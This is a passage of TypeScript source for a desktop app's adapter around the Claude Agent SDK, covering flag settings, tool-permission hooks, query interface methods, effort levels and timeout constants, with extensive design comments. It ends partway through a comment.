 * 🔴 **Everything this adapter puts in the flag-settings layer, in ONE place** (166).
 *
 * `Options.settings` is `string | Settings` — a path to a file, or an object. Both option builders
 * write the object form, and both write it by calling this (a session's through
 * {@link ClaudeSessionHandle.launchFlagSettings}), because the failure mode of two writers is not a
 * type error: it is one of them winning. 106's `ultracode` is merged ON TOP of what the builder made
 * at the single call site that may know about it, so a session that asked for ultracode still gets
 * its memory directory.
 *
 * ⚠️ **A function rather than a constant**, because the value depends on the profile — which is the
 * point of it.
 *
 * 🔴 **736 · R95 / 740 · R99 — the rules a person chose to keep, loaded as the CLI would load them**
 * — `kept` is read out of the provider home's `settings.json` and, since `740`, the PROJECT's local
 * settings, where the CLI keeps a *"don't ask again"* ({@link keptRulesForALaunch}), and handed over as flag
 * settings, because `settingSources: []` loads neither file (measured). 🔴 **W4.189 · beside them,
 * the work folders** ({@link flagPermissionsOf}). Absent when there are neither, so a launch with no
 * kept rule and no work folder is byte-identical to one before `736`.
 */
function flagSettingsFor(
  providerHome: string,
  kept: KeptRuleLists,
  workFolders: readonly string[] = [],
): Settings {
  const permissions = flagPermissionsOf(kept, workFolders)
  return {
    autoMemoryDirectory: claudeAutoMemoryDir(providerHome),
    ...(permissions === null ? {} : { permissions }),
  }
}

/** The kept rules one launch read ({@link keptRulesForALaunch}) — each list present only when non-empty. */
type KeptRuleLists = Awaited<ReturnType<typeof keptRulesForALaunch>>

/**
 * 🔴 **W4.189 · the `permissions` this adapter puts in the flag layer: the kept rules, and the work
 * folders as `additionalDirectories`** — ONE derivation for the launch ({@link flagSettingsFor}) and
 * for every change between turns (`applyFlagSettings`), so the two cannot come to disagree.
 *
 * ⚑ **The flag layer and not `Options.additionalDirectories`** (`--add-dir`), because a launch flag
 * cannot be taken back while the CLI runs, and a work folder is a grant that can end mid-conversation.
 * ⚠️ **`null` is "nothing to put there"**: no kept rule and no folder. The launch then writes no key
 * at all, and a change back to that state sends `permissions: null` — see
 * {@link ClaudeSessionHandle.applyPendingSettings} for why that is the launch state and not a
 * loosening.
 */
function flagPermissionsOf(
  kept: KeptRuleLists,
  workFolders: readonly string[],
): NonNullable<Settings['permissions']> | null {
  if (workFolders.length > 0) return { ...kept, additionalDirectories: [...workFolders] }
  return Object.keys(kept).length === 0 ? null : { ...kept }
}

/** The same folders in the same order — a work-folder list that asks the CLI for no change. */
function sameFolders(a: readonly string[], b: readonly string[]): boolean {
  return a.length === b.length && a.every((folder, at) => folder === b[at])
}

/**
 * 🔴 **`721` · R75 — what a Claude reset row cites: BOTH frames it is read off.** The reset says a
 * new conversation began; the `system/init` after it names the one to continue in. A row citing the
 * reset alone would name an id that frame does not carry (it names one with no transcript), and the
 * row exists so a person can cross-check the id against the Events log.
 */
const RESET_SOURCE = 'conversation_reset + system/init'

/**
 * The two directories one launch's allowances are derived from (071; `726` · R92: nothing more).
 *
 * `cwd` is a parameter rather than a field of the context because the two launches take it from
 * different places — `StartOptions.cwd` on a start, `SessionRef.cwd` on a resume.
 *
 * Carry cwd and provider home without a protected root or handed-file scan; see `internal/confinement.ts`.
 */
function confinementFor(cwd: string, context: ProviderRuntimeContext): SessionConfinement {
  return { cwd, providerHome: context.providerHome }
}

/**
 * ⛔ **The `Stop` hook, and it is a READER — it never decides anything** (253).
 *
 * `session_crons` is the one place the provider states what this session has promised to do later,
 * and `250` proved with a positive control that the message stream carries none of it. So this hook
 * exists to copy a field out and hand it on, as the scheduling receipts' hooks do
 * ({@link schedulingReceiptHooks}); the other hooks in this file are guards.
 *
 * ⚠️ **It must be inert on every path, including its own failure.** A `Stop` hook can restart a turn
 * — `decision: 'block'` is documented as *"the model should continue"* — so `{ continue: true }` is
 * returned unconditionally, past a `try`/`catch` that swallows the read: a throw here would surface
 * inside the CLI's hook machinery at the exact moment a turn is trying to end, and a display fact
 * may not be able to wedge a conversation. `noteSessionCrons` is total for the same reason.
 *
 * ⚑ The `hook_event_name` check is not defensive noise — this array is registered under `Stop` and
 * nothing else, so the test never fails. It is what NARROWS `HookInput` to the one member that has
 * a `session_crons` field, which is the compiler holding the reader to the right payload.
 *
 * ⚑ **Only `Stop`, deliberately.** `SubagentStopHookInput` carries the identical field and would
 * narrow the blind window inside a long turn — but a sub-agent's payload is a different reading of
 * *"this session"* until something measures it, and `226`'s rule is that a capture decides. See the
 * `253` response for what the capture says.
 *
 * ⚑ **F099 · and the effort the turn ran at** — `effort.level`, which the CLI puts on every hook it
 * fires within a turn (`Stop` among them) on a model that takes an effort: *"Active effort level for
 * the current turn … after any silent downgrade for the selected model"*. ⚑ It is the only place a
 * headless session states it: the per-turn `system/init` of an SDK child carries no `effort` (CLI
 * 2.1.287 builds it without one; only a Remote Control bridge's init does), the result's
 * `modelUsage` names models and tokens, and the transcript records no effort. A `Stop` is the main
 * thread's — a sub-agent ends on `SubagentStop`, which is not registered. ⚠️ A turn that is
 * interrupted or fails ends without a `Stop`, so it reports no effort.
 */
function scheduleReaderHooks(
  note: (crons: unknown) => void,
  noteEffort: (level: string) => void,
): NonNullable<NonNullable<Options['hooks']>['Stop']> {
  return [
    {
      hooks: [
        async (input) => {
          if (input.hook_event_name === 'Stop') {
            // ⚑ The effort first, so the level's event already carries it.
            try {
              const level = input.effort?.level
              if (typeof level === 'string' && level !== '') noteEffort(level)
            } catch {
              /* an effort we could not read is one we do not report, never a broken turn */
            }
            try {
              note(input.session_crons)
            } catch {
              /* a level we could not read is a level we do not publish, never a broken turn */
            }
          }
          return { continue: true }
        },
      ],
    },
  ]
}

/**
 * The hooks that read the provider's scheduling calls as they run ({@link SchedulingCalls}): each
 * notes what it is handed and lets the call go on. ⚑ Matched to the four tools by name, so no other
 * tool's input or output is sent to this process for them, and no other call waits on them.
 */
/** The four tools' names as a hook matcher: names and `|` only, which the CLI reads as exact names. */
export const SCHEDULING_TOOLS_MATCHER = SCHEDULING_TOOLS.join('|')

function schedulingReceiptHooks(
  called: (input: unknown) => void,
  answered: (input: unknown) => void,
): {
  PreToolUse: NonNullable<NonNullable<Options['hooks']>['PreToolUse']>
  PostToolUse: NonNullable<NonNullable<Options['hooks']>['PostToolUse']>
} {
  return {
    PreToolUse: [
      {
        matcher: SCHEDULING_TOOLS_MATCHER,
        hooks: [
          async (input) => {
            if (input.hook_event_name === 'PreToolUse') called(input)
            return { continue: true }
          },
        ],
      },
    ],
    PostToolUse: [
      {
        matcher: SCHEDULING_TOOLS_MATCHER,
        hooks: [
          async (input) => {
            if (input.hook_event_name === 'PostToolUse') answered(input)
            return { continue: true }
          },
        ],
      },
    ],
  }
}

/**
 * ⚠️ **Typed as its `PreToolUse` alone**, and the launch lists it beside the other hooks by name
 * ({@link scheduleReaderHooks}, {@link schedulingReceiptHooks}): a merge by object spread would drop
 * one of two entries under the same key without a word.
 */
function promptGuardHooks(
  effectiveMode: () => ApprovalMode,
  /**
   * 🔴 **486 · this app's own verbs whose rails are the whole gate** — see
   * {@link railsAreTheWholeGate}. ⚠️ Fixed for the life of a query — `claudeMcpServersFor` builds
   * one instance per `query()` and nothing may cache it across launches — so the only thing it
   * reads per call is the call's own arguments.
   */
  railsGateThis: (toolName: string, toolInput: unknown) => boolean,
): { PreToolUse: NonNullable<NonNullable<Options['hooks']>['PreToolUse']> } {
  return {
    PreToolUse: [
      {
        hooks: [
          async (input) => {
            if (input.hook_event_name !== 'PreToolUse') return { continue: true }
            // ⚠️ ABOVE the mode check, and the position IS the fix (063). See the section above.
            // Nothing below may exempt these: a session grant cannot answer a question either.
            if (USER_INPUT_TOOLS.has(input.tool_name)) {
              return askFor('questions')
            }
            // Do not add an app-owned path scan here. Path-bearing calls continue through the provider permission flow and the selected approval mode; app tools retain their own rails below.
            //
            // 🔴 **486 · this app's own verbs do not raise a card — their rails are the gate**
            // (HO-031 §2.4).
            //
            // ⛔ **Measured, in a real session:** a project manager needed a human approval to call
            // `mcp__brobot__reply_to_parent` — *"it had to ask permission to answer its parent"* —
            // and *"double-gating them means every task needs a human click to close, which breaks
            // the loop the tools exist to make."* ⚑ **The rails already answer *may you* for each
            // of these verbs, and they answer it better than a permission card can**: they answer
            // it per call, against this caller's own grants, in words a model can classify.
            //
            // ⚑ **728 · and while planning too** — the plan floor that used to sit above this line
            // (140) is gone (R93), and these verbs keep the rails as their whole gate in every mode:
            // R93 keeps *"the orchestration grants on BroBot's own agent tools"*. ⚠️ An `allow` here
            // out-votes the CLI's own MCP ask — measured before an external server's tool, planning
            // or not (`mcp`, `plan-mcp`); this app's in-process verbs were not measured — and it did
            // so outside planning before `728` too. `728` tried standing it aside while planning
            // and withdrew that in review: it put a card in front of `create_project`, whose whole
            // effect is a card (486, 461).
            //
            // ⛔ **`allowFor`, not `{continue: true}`** — see {@link railsAreTheWholeGate}. And it
            // is ABOVE the auto yield only in the sense that it does not need it: in `auto` the
            // yield below would have answered the same way, so this line changes `ask` alone.
            if (railsGateThis(input.tool_name, input.tool_input)) {
              return allowFor('BroCrew gates its own tools with rails, not with a card')
            }
            // Asked per call, never captured: see the ⚠️ above.
            if (isAutoApprove({ approvalMode: effectiveMode() })) return { continue: true }
            // ⚑ **`726` · R92 and `728` · R93 — no exemption list and no grant check here any more.**
            // A read outside the working directory was re-carded here until `726`; the CLI asks
            // about it itself (measured, `721`'s `probe:claude-scan-after-cd`, arms B, F, G, H). And
            // the read-only tools and a session's grants took an exit that, since `728`, every call
            // takes: a grant is the CLI's own rule now (since `736` its own suggestion,
            // {@link sessionGrantOf}), which it honours.
            // 🔴 **728 · R93 — the CLI's own permission engine decides every other call.**
            // ⛔ Until `728` this line forced `ask` on every tool the lines above did not exempt
            // (`013`, from `007` P1-6: *"the CLI's own safe/dangerous classifier auto-allowing a
            // consequential tool with no card at all"*). ⚑ **Measured** (`probe:tool-calls-as-the-
            // cli`, bundled CLI, loopback, this hook out): the CLI's engine asks before `rm`, a
            // `Write`, an `Edit`, `WebFetch` and every MCP tool, and runs `ls`, `echo` and
            // `git status` without asking — so, of the calls measured, the card this line added
            // before those three was BroBot's own ask, and R93 removed it. What is left is the
            // provider's: a call the CLI asks about reaches `canUseTool` and its card, a call it lets
            // through runs.
            return { continue: true }
          },
        ],
      },
    ],
  }
}

/** The subset of the SDK `Query` this adapter drives — kept minimal so tests can inject a fake. */
export interface ClaudeQuery extends AsyncIterable<SDKMessage> {
  setMcpServers?(servers: NonNullable<Options['mcpServers']>): Promise<unknown>
  reloadPlugins?(): Promise<unknown>
  interrupt(): Promise<unknown>
  /**
   * Detach the SDK transport: after `close()` no further messages arrive (teardown).
   *
   * ⛔ **This is a DETACHMENT receipt, not an exit receipt** (202, from 191 H3). It returns `void`
   * and the CLI child outlives it — measured against the pinned 0.3.218, five descendants per query,
   * **3/3 trials with a child still alive at the moment `close()` returned**, gone about 260 ms
   * later. See {@link ClaudeQuery.return} for the one that waits.
   */
  close(): void
  /**
   * **The exit receipt, and it IS obtainable at the pinned SDK** (202, from 191 H3).
   *
   * ⛔ **The dispatch asked whether one exists, and the answer measured on the wire is yes.** The
   * pinned `Query` extends `AsyncGenerator<SDKMessage, void>` (`sdk.d.ts:2705`), so `return()` is
   * part of its declared surface — and the shipped implementation is
   * `async return(e) { return await this.cleanup(), this.sdkMessages.return(e) }`, where `cleanup()`
   * memoizes the very `performCleanup()` that `close()` fires and forgets. `performCleanup` ends
   * with `Promise.race([this.transport.waitForExit(), 2000 ms])` — `Transport.waitForExit`'s own doc
   * says it exists so *"`.return()` / asyncDispose don't resolve while the child is still draining
   * the stdin EOF that `close()` just sent"*.
   *
   * ⚑ **Measured, three trials each, attributed by walking our own process tree** (never
   * `pgrep claude`):
   *
   * | | returns in | children still alive at that moment |
   * |---|---|---|
   * | `close()` | 0–1 ms | ⛔ **3 of 5, 3/3 trials** |
   * | `await return()` | 186–280 ms | **0, 0/3 trials** |
   *
   * ⚠️ **Still not a PID**, and 186 is right that this repository owns none for a Claude CLI. What
   * it is, is a joinable promise bounded by the SDK at two seconds — which is what a quit needs and
   * what {@link ClaudeSessionHandle.close} now awaits.
   *
   * OPTIONAL here for the same reason {@link supportedModels} is: a fake written before this existed
   * must keep compiling, and its absence is read as "this query cannot say", never as an exit.
   */
  return?(value?: unknown): Promise<unknown>
  /**
   * The models this login may run (058) — `Query.supportedModels()`, `sdk.d.ts:2864`.
   *
   * OPTIONAL here and required on the real `Query`, so that a fake written before this existed does
   * not have to grow a method to keep compiling. {@link ClaudeRuntime.listModels} treats its absence
   * as a provider that cannot answer, which is the same honest failure as a rejected call.
   */
  supportedModels?(): Promise<ModelInfo[]>
  /**
   * Who this session is signed in as — `Query.accountInfo()`. Every field of its answer is
   * optional, and a login may name no email.
   *
   * OPTIONAL for the same reason {@link supportedModels} is, and its absence is *"this query cannot
   * say"*: the account is not known.
   */
  accountInfo?(): Promise<AccountInfo>
  /**
   * ⛔ **The whole handshake answer, INCLUDING the command list** (279) —
   * `Query.initializationResult()`, `sdk.d.ts:2826`.
   *
   * ⚑ **This rather than `supportedCommands()`, and the choice is measured.** `279` §2 asks whether
   * the adapter can take the list from init instead of making a separate call; `probe:provider-commands`
   * answered by timing both against a real login. `initializationResult()` returned **44 rows in
   * 1 918 ms** — the CLI handshake, which a session is paying for anyway — and `supportedCommands()`
   * then returned the identical 44 names in **0 ms**, because the SDK's own doc says this one
   * *"[returns] the cached first-connect result"* while `reinitialize()` is the one that re-asks.
   * So neither costs a round trip after the handshake, and taking it from the handshake means one
   * fewer control request on every session start.
   *
   * OPTIONAL for the same reason {@link supportedModels} is: a fake written before this existed must
   * keep compiling, and its absence is read as *"this query cannot say"* — never as an agent with no
   * commands, which is a different fact and is the one `279` §2 forbids showing.
   */
  initializationResult?(): Promise<{ commands: readonly unknown[] }>
  /**
   * 🔴 **708 · the command list asked for again** — `Query.supportedCommands()`, `sdk.d.ts:2858`.
   *
   * ⚑ **Not a second read of the handshake**: the SDK says it *"tracks the latest push"* of
   * `commands_changed`, so after a mid-session change it answers with the list that change carried,
   * where {@link initializationResult} would still answer with the first. `279` measured it at
   * **0 ms** once the handshake has answered. {@link ClaudeSessionHandle.providerCommands} is its
   * one caller.
   *
   * OPTIONAL for {@link supportedModels}' reason, and its absence is *"this query cannot say"*.
   */
  supportedCommands?(): Promise<readonly unknown[]>
  /**
   * Change the model for subsequent responses (076) — `Query.setModel()`, `sdk.d.ts:2755`.
   *
   * OPTIONAL for the same reason {@link supportedModels} is: a fake written before 076 must keep
   * compiling. The adapter treats absence as "this query cannot be re-modelled" and says so at the
   * turn boundary rather than pretending the change landed.
   */
  setModel?(model?: string): Promise<void>
  /**
   * Change the permission mode for the current session (076) — `Query.setPermissionMode()`,
   * `sdk.d.ts:2726`. This adapter calls it for the PLAN bit only; see {@link permissionModeFor}.
   */
  setPermissionMode?(mode: PermissionMode): Promise<void>
  /**
   * Merge settings into the flag layer mid-session (076) — `Query.applyFlagSettings()`,
   * `sdk.d.ts:2804`.
   *
   * ⚠️ **This, not `setMaxThinkingTokens`, is how effort moves mid-session at our pin**, and the
   * difference is not cosmetic. `setMaxThinkingTokens` is `@deprecated` (still, at 0.3.281) and sets
   * a token CEILING — the SDK says on Opus 4.6 it is "treated as on/off". Effort is a separate axis
   * with its own vocabulary (`EffortLevel`), and `applyFlagSettings` is the only member of the pinned
   * `Query` that moves the RUNNING session's effort — 0.3.281's `updateSettings` also takes
   * `effortLevel`, but saves it *"without setting the running session's level"* (`sdk.d.ts:2813`).
   * Its doc names the case that matters here: *"`effortLevel` also accepts `'max'` … it is
   * session-only"* (0.3.218 said *"session-scoped"*).
   *
   * 🔴 **W4.189 · and the work folders move through it too**, as `permissions.additionalDirectories`
   * ({@link flagPermissionsOf}). ⚠️ Its doc: *"Successive calls shallow-merge top-level keys — a second
   * call with `{permissions: {...}}` replaces the entire `permissions` object"*, so every call sends
   * the kept rules the launch put there beside the list — see {@link ClaudeSessionHandle.keptRules}.
   */
  applyFlagSettings?(settings: {
    effortLevel?: EffortLevel | null
    permissions?: Settings['permissions'] | null
  }): Promise<void>
  /**
   * Detach in-flight foreground work (247) — `Query.backgroundTasks()`, `sdk.d.ts:3072`.
   *
   * ⚑ **Exposing this is what makes `is_backgrounded` reachable at all.** 247 §1 measured the
   * conversion signal `task_updated{patch:{is_backgrounded}}` arriving in **none** of four live
   * captures, because a model that asks for `run_in_background` up front produces a task that was
   * never foreground. `245` saw the flag only because its harness called this method — so until
   * now it was, in `235`'s words, a live mechanism with no live input.
   *
   * OPTIONAL for the same reason {@link supportedModels} is: a fake written before this existed must
   * keep compiling, and its absence is read as "this query cannot detach", never as a refusal.
   */
  backgroundTasks?(toolUseId?: string): Promise<boolean>
  /**
   * Stop one running task (247) — `Query.stopTask()`, `sdk.d.ts:3070`.
   *
   * ⚠️ Its doc promises a `task_notification` with status `'stopped'`, not that the process is gone
   * when the promise settles — which is why {@link SessionHandle.stopBackgroundWork} documents the
   * receipt as the event rather than the return.
   */
  stopTask?(taskId: string): Promise<void>
}

/**
 * The efforts Claude will accept, taken from the pinned SDK's own union rather than restated (076).
 *
 * `EffortLevel` is `'low' | 'medium' | 'high' | 'xhigh' | 'max'` at `sdk.d.ts:627`, and 044's rule
 * applies: *"presence in a vendored type is a schema verdict"*. Writing the five strings out here
 * would be a second list free to drift from the first — so the array is declared as `EffortLevel[]`
 * and the compiler is what keeps it complete: adding a member to the SDK union without adding it
 * here is caught by {@link claudeEffortsAreExhaustive} below.
 */
const CLAUDE_EFFORTS = ['low', 'medium', 'high', 'xhigh', 'max'] as const satisfies EffortLevel[]

/**
 * A compile-time proof that {@link CLAUDE_EFFORTS} lists every `EffortLevel` the pinned SDK declares.
 *
 * `satisfies EffortLevel[]` above catches an entry the SDK does NOT have; this catches one the SDK
 * has and we have MISSED, which is the direction that actually costs a user something — it is
 * exactly how `xhigh` and `max` came to be invisible for two months. If the SDK gains a level, this
 * line stops compiling and the menu grows instead of quietly staying short.
 */
type _ClaudeEffortsAreExhaustive =
  Exclude<EffortLevel, (typeof CLAUDE_EFFORTS)[number]> extends never
    ? true
    : ['missing effort levels', Exclude<EffortLevel, (typeof CLAUDE_EFFORTS)[number]>]
const claudeEffortsAreExhaustive: _ClaudeEffortsAreExhaustive = true
void claudeEffortsAreExhaustive

/** Is this a level Claude will actually take? See {@link CLAUDE_EFFORTS}. */
function claudeEffort(value: string): EffortLevel | null {
  return (CLAUDE_EFFORTS as readonly string[]).includes(value) ? (value as EffortLevel) : null
}

/**
 * The one place `permissionMode` is computed — for the launch Options and for the live
 * `setPermissionMode` call, which are now the SAME function (076, unified by 140).
 *
 * ⚠️ **It carries the PLAN bit and nothing else, and `bypassPermissions` is never asked for.** 076
 * had already reached that conclusion for the mid-session call and wrote two paragraphs on why (see
 * the history below); 140 measured that the launch had no choice either, and the two derivations
 * that could drift became one that cannot.
 *
 * The two reasons 076 gave for the live path, both still exact:
 *
 *  1. **`bypassPermissions` needs a companion the launch owns.** `allowDangerouslySkipPermissions`
 *     is an `Options` field the SDK requires *"to ensure intentional bypassing"*, so a session that
 *     asked for the mode without it would be asking for something the SDK will not honour.
 *  2. **Nothing is lost by asking for `'default'`.** Unattendedness is delivered by
 *     `handleCanUseTool`'s `isAutoApprove` early return, not by the mode — the already-shipped,
 *     already-tested composition. Same outcome, different path.
 *
 * ⛔ **And 140 turned "nothing is lost" from an argument into a measurement.** Every Claude session
 * this app has ever launched ran as `permissionMode: 'default'` whatever it asked for, because
 * `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB` forced it — see {@link ClaudeRuntime.childEnvAdditions}. So
 * `'bypassPermissions'` has never once been in force here, and dropping the request is the change
 * that keeps a non-plan session behaving exactly as it already did now that the override is gone.
 * Asking for it again would be granting, for the first time, a mode under which the SDK does not
 * invoke `canUseTool` at all — on the strength of a code path nothing in this app has ever run.
 *
 * 030's "plan takes precedence over yolo" is no longer expressed as an enum precedence at all: plan
 * is the only thing this enum carries. ⚠️ The floor that made planning read-only in this app's own
 * hook, which yolo could not skip, is gone since `728` (R93): the provider's plan mode decides.
 */
function permissionModeFor(planMode: boolean): PermissionMode {
  return planMode ? 'plan' : 'default'
}

/** How long `close()` waits for the SDK to acknowledge an interrupt before forcing terminalization. */
const CLOSE_INTERRUPT_TIMEOUT_MS = 2000

/**
 * How long a model probe may take before it is treated as unanswerable (058 review).
 *
 * Measured at 1.4 s against the pinned SDK, so 15 s is roughly ten times the observed cost — wide
 * enough that a cold start or a slow network is not mistaken for a hang, short enough that a
 * genuinely stuck child does not hold the launcher's menu hostage for a noticeable time. It is
 * generous ON PURPOSE: the penalty for being too eager is a missing menu, and the penalty for being
 * too patient used to be a permanently pending promise.
 */
const MODEL_PROBE_TIMEOUT_MS = 15_000

/**
 * How long the session's own command-list read may take before it is given up on (279).
 *
 * ⚑ **The same 15 s as {@link MODEL_PROBE_TIMEOUT_MS}, and for the same reason rather than by
 * copying it**: both wait on a CLI handshake, and that is what was measured — `initializationResult()`
 * answered in **1 918 ms** against a real login, so this is roughly eight times the observed cost.
 * ⚠️ **Generous on purpose.** Nothing waits on the HANDSHAKE's read — the penalty for being too eager is a
 * palette band that is silently missing on a cold start, and the penalty for being too patient is
 * one detached promise that resolves late into a session that has already terminalized — where
 * `emit` drops it. ⚠️ **708 · the host's ASK waits on {@link ClaudeSessionHandle.providerCommands}**,
 * which this also bounds, and the host holds it to its own shorter wait.
 */
const COMMAND_READ_TIMEOUT_MS = 15_000

/**
 * The same bound for `interrupt()` (074). A stalled provider may never acknowledge, and the user is
 * interrupting precisely because nothing is happening — waiting forever for the ack would make the
 * one recovery path as stuck as the thing it recovers from.
 */
const INTERRUPT_ACK_TIMEOUT_MS = 2000

/**
 * How long the queued model/effort/plan changes may take to land before the turn that is waiting on
 * them is failed (202, from 191 H5).
 *
 * ⛔ **There was no bound at all**, and `send` awaits these three control requests between opening
 * the turn and pushing the user's message. An SDK that never answered therefore hung the send IPC
 * for the life of the app, with a turn open and a renderer waiting — the same never-settling shape
 * 058's review found on the model probe and 074 found on `interrupt`, in the one place where the
 * caller is a person who has just pressed Send.
 *
 * Ten seconds because these are local control requests over a pipe to a process that is already
 * running — `interrupt` gets two, and the probe fifteen because it may be starting one. Wide enough
 * that a busy machine is never mistaken for a wedged one; short enough that the composer comes back.
 */
const SETTINGS_ACK_TIMEOUT_MS = 10_000

/**
 * How long `close()` waits for the CLI child to actually exit (202, from 191 H3).
 *
 * See {@link ClaudeQuery.return}: the SDK's own `performCleanup` races `transport.waitForExit()`
 * against two seconds, and around it runs the cleanup callbacks and a transcript flush. Measured at
 * 186–280 ms end to end, so five seconds is about twenty times the observed cost — and it is a
 * TEARDOWN bound (`withTimeout`, which resolves), because a CLI that will not exit must not be able
 * to hold a quit open.
 */
const CLOSE_EXIT_RECEIPT_TIMEOUT_MS = 5_000

/**
 * How much of the CLI's stderr may reach the user-facing error (240 §3).
 *
 * The same 500 the Codex transport's `stderrSuffix` uses, for the same reason: the sentence that
 * explains an exit is short, and everything past it belongs to the log, where 085 puts a provider's
 * raw text. {@link ClaudeChildWitness} keeps 4 KiB; this is what is quoted out of it.
 */
const STDERR_CLAUSE_BYTES = 500

/** Factory for a query — the real `query` by default; a fake in tests. */
export type QueryFactory = (params: {
  prompt: AsyncIterable<SDKUserMessage>
  options: Options
}) => ClaudeQuery

/**
 * A prompt that initializes the CLI and never says anything to it (058).
 *
 * Used only by {@link ClaudeRuntime.listModels}. The `await` before the `yield` is the point: the
 * generator is a valid `AsyncIterable<SDKUserMessage>` — which is what `query()` demands — that
 * parks on the first pull and never resolves, so no user message is ever produced and no turn ever
 * starts.
 *
 * The unreachable `yield` is there to make the ELEMENT TYPE say what this is for. It is not load
 * bearing for the compiler and this comment used to claim it was: `AsyncGenerator<never>` is
 * assignable to `AsyncIterable<SDKUserMessage>` perfectly well, so deleting the yield would
 * typecheck (058 review). Keeping it is a readability choice — the signature then states the
 * contract this satisfies instead of leaving the next reader to infer it from the call site.
 */
async function* neverSends(): AsyncGenerator<SDKUserMessage> {
  await new Promise<void>(() => {})
  yield undefined as unknown as SDKUserMessage
}

/** Whether a persisted session exists in the profile home (for honest resume). Injectable for tests. */
export type SessionExists = (
  sessionId: string,
  cwd: string,
  providerHome: string,
) => Promise<boolean>

/** The `canUseTool` callback's third argument (subset this adapter reads). */
interface ToolPermissionOptions {
  toolUseID: string
  title?: string
  signal?: AbortSignal
  /**
   * The SDK's OWN correctly-scoped rules for "do not ask me again this session" (031).
   *
   * Its docs are unambiguous: *"if presenting the user an option 'always allow' … this full set of
   * suggestions should be returned as the `updatedPermissions`"*. This adapter declared only
   * `toolUseID`/`title`/`signal`, so the field never arrived and the answer to the bug was sitting
   * one property away the whole time. Echoing it is strictly better than anything constructed here:
   * the SDK knows that a Bash grant should be a PREFIX rule rather than a blanket one, and this
   * adapter does not. ⚑ **`736` · R94/R95 — echoed again** ({@link sessionGrantOf},
   * {@link alwaysGrantOf}), after `728` had replaced it with a file rule of this app's own. 🔴 **`740` ·
   * R99 — and no longer WHOLE**: what is echoed is the interactive CLI's own choice out of this set
   * ({@link cliRowOf}); for an `rm`, only its folder.
   */
  suggestions?: PermissionUpdate[]
  /**
   * Why the request was raised — ⚠️ on EVERY ask. Where only our guard wanted the card it is our own
   * hook's words handed back; where the CLI's own check asked too it is the CLI's (`695`'s probe, the
   * unmarked and the marked arm). ⚑ **700 · read by {@link providerReasonOf}**, which carries it only
   * on a marked ask.
   */
  decisionReason?: string
  /** The path that triggered the request, when a tool reached outside the allowed directories. */
  blockedPath?: string
  /**
   * 🔴 **695 · R36a — "offer no *don't ask again*"** (`sdk.d.ts:268-272`, the SDK's own mapping of
   * the control request's `suppress_always_allow_rule`). Read by {@link askMarks}.
   */
  suppressAlwaysAllowRule?: boolean
  /** 🔴 **695 · R36b — "default to *no*"** (`sdk.d.ts:263-267`, from `default_to_no`). */
  defaultToNo?: boolean
}

/**
 * 🔴 **695 · what a pending ask is answered when a person presses Stop instead of answering it.**
 *
 * ⚑ A refusal, exactly as before — only the REASON is new. Until 695 every settle said *"session
 * closed"*, which is true at a close and was harmless at a Stop because the CLI killed a background
 * agent on the interrupt anyway. Declared `perTaskStopAffordance` spares it, so its pending ask is
 * now denied into a model that keeps running; the words it is given have to be true.
 */
const STOPPED_INSTEAD_OF_ANSWERING: PermissionDecision = {
  outcome: 'deny',
  message: 'The person pressed Stop instead of answering this request.',
}

/**
 * 🔴 **695 · the two marks the CLI can put on an ask, as the card will carry them** — `true` or
 * absent, never `false`, so an unmarked card's event is byte-identical to one from before 695.
 *
 * ⚑ **What the CLI marks**: `suppressAlwaysAllowRule` rides every ask whose own safety check the
 * classifier may not approve — a real background `&` in a Bash command (measured by
 * `packages/runtime/smoke/permission-markers-probe.smoke.ts`), a dangerous `rm`, a write that
 * resolves outside the working directory — because the whole-tool rule
 * *"don't ask again"* would write grants more than the one act shown. `defaultToNo` rides only the
 * claude.ai Artifact tool's deletions, which BroBot does not load. ⚠️ **Until `728` our own guard
 * hook forced every card**, and the CLI then carried these marks only when the tool's OWN check
 * would have asked too — which is exactly the case they are about; since `728` every card is the
 * CLI's own ask, so the marks ride exactly the asks the CLI raises.
 */
/**
 * ⚑ **728 · did the CLI offer a "don't ask again" of its own on this ask** — its `suggestions`. Its
 * plan-mode check sends none (measured), and that is what withholds the conversation grant while
 * planning.
 */
function offersAStandingRule(options: ToolPermissionOptions): boolean {
  return Array.isArray(options.suggestions) && options.suggestions.length > 0
}

function askMarks(options: ToolPermissionOptions): {
  suppressAlwaysAllowRule?: true
  defaultToNo?: true
} {
  return {
    ...(options.suppressAlwaysAllowRule === true ? { suppressAlwaysAllowRule: true as const } : {}),
    ...(options.defaultToNo === true ? { defaultToNo: true as const } : {}),
  }
}

/**
 * 🔴 **700 · `695` F-f — the provider's own reason for an ask it MARKED, as the card will carry it**,
 * or nothing. See `events.ts`'s `providerReason` for what was measured.
 *
 * ⛔ **Three refusals:**
 *
 *  1. **no mark, no reason — a SCOPE rule** (the brief's *"a marked ask"*). The reason is drawn
 *     beside the lines that say what the marks did, and explains them; an unmarked ask has no such
 *     line. ⚠️ **What it costs:** an unmarked ask whose reason IS the CLI's own is not drawn —
 *     CLI 2.1.218 sent the `&` sentence unmarked; at 2.1.281 the only unmarked reason measured was
 *     our own hook's, which refusal 2 refuses anyway.
 *  2. **our own words are never the provider's — a TRUTH rule.** A reason whose cleaned text
 *     CONTAINS one of {@link OUR_OWN_ASK_REASONS} is refused on any ask, so a CLI that wrapped our
 *     sentence in codes or a prefix still does not get it drawn as the provider's. ⚠️ It holds while
 *     the CLI hands our sentence back unaltered inside whatever it adds, as measured at 2.1.281.
 *  3. **cleaned, and dropped when nothing or too much is left** — see {@link wordsForACard}; a
 *     reason longer than {@link MAX_PERMISSION_DETAIL_CHARS} is dropped, not cut, as `summary` is.
 */
function providerReasonOf(
  options: ToolPermissionOptions,
  marks: ReturnType<typeof askMarks>,
): { providerReason?: string } {
  const said = options.decisionReason
  if (marks.suppressAlwaysAllowRule !== true && marks.defaultToNo !== true) return {}
  // ⚑ **709 · the cleaning is {@link wordsForACard}'s now**, shared with the Codex adapter's
  // `agentReason` (R44) — one policy for any words a card carries that this app did not write.
  const cleaned = wordsForACard(said)
  if (cleaned === null) return {}
  if (OUR_OWN_ASK_REASONS.some((ours) => cleaned.includes(ours))) return {}
  return { providerReason: cleaned }
}

/**
 * The directory name Claude gives a cwd under `<home>/projects` (086, fixing a live P1).
 *
 * EVERY non-alphanumeric character becomes `-`, and consecutive ones are **not** collapsed — so
 * `/@` becomes `--`. Verified against the real directories on disk, not inferred:
 *
 *     /Users/me/Library/Application Support/@brobot2/desktop/scratch/sess_0bd131b7-…
 *  →  -Users-me-Library-Application-Support--brobot2-desktop-scratch-sess-0bd131b7-…
 *
